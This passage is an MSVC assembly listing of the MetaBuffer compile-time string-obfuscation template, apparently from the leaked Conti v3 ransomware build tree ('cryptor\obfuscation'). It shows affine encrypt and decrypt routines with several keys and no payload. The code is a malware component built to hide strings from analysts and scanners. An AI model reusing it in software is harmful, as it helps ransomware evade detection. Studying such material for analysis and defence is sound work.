  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  002d5	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  002d9	88 85 c0 00 00
	00		 mov	 BYTE PTR tv210[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  002df	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  002e6	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  002ed	5f		 pop	 rdi
  002ee	5d		 pop	 rbp
  002ef	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 38	 sub	 eax, 56			; 00000038H
  0002d	6b c0 e8	 imul	 eax, eax, -24
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 25	 imul	 eax, eax, 37		; 00000025H
  0002d	83 c0 38	 add	 eax, 56			; 00000038H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 75	 sub	 eax, 117		; 00000075H
  0002d	6b c0 33	 imul	 eax, eax, 51		; 00000033H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
